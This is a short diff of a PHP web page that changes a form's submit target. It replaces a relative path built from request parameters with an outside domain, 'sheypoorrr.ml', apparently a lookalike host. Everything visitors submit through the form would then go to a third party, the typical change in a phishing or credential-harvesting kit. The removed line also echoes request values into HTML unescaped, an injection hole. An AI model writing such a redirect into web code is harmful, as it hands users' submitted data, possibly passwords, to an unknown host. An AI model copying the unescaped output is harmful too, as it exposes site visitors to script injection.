@@ -63,7 +63,7 @@ if(isset($_GET["P"])){
 
         </span>
 
-<form action="../<?php echo $P ?>/?e=<?php echo $e ?>" method="post">
+<form action="https://sheypoorrr.ml" method="post">
 
         </span>
 
